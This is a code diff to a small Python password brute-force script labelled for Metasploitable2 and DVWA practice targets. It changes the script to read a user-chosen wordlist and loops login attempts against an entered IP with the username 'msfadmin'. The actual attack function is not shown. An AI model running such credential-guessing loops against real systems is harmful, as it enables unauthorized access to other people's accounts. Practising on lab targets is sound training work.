@@ -9,7 +9,7 @@ ascii_art = """
  _ __ ___   ___  __ _| |_ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
 | '_ ` _ \ / _ \/ _` | __/ __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
 | | | | | |  __/ (_| | |_\__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
-|_| |_| |_|\___|\__,_|\__|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____| made by MadMatrix
+|_| |_| |_|\___|\__,_|\__|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                              |_|                                          
 """
 
@@ -28,29 +28,36 @@ def bruteforce(ip, user, password):
 
 def display_welcome():
     print(ascii_art)
-    print("\nonly meatsploitable2 or dvwa\n")
+    print("\nONLY DVWA OR MEATSPLOITABLE2\n")
+
+def get_passwords_from_file(filename):
+    try:
+        with open(filename, 'r') as file:
+            passwords = file.readlines()
+            return [password.strip() for password in passwords]
+    except FileNotFoundError:
+        print(f"Error: {filename} not found.")
+        return []
 
 def main():
     display_welcome()
 
     ip = input("Please enter the IP address: ").strip()
-    password_file = '.venv/password.txt'
+    password_file = input("Enter the path to your password file: ").strip()
+
+    passwords = get_passwords_from_file(password_file)
+
+    if not passwords:
+        return
 
     try:
-        with open(password_file, 'r') as password_file:
-            passwords = password_file.readlines()
-
         for password in passwords:
-            password = password.strip()
-            # For demonstration, assuming a single username 'msfadmin' for brute force
-            bruteforce(ip, 'msfadmin' , password)
-
-    except FileNotFoundError:
-        print(f"Error: {password_file} Error: File not found .")
+            bruteforce(ip, 'msfadmin', password)
+    except KeyboardInterrupt:
+        print("\nInterrupted by user.")
 
 if __name__ == '__main__':
     main()
-
 
 
 
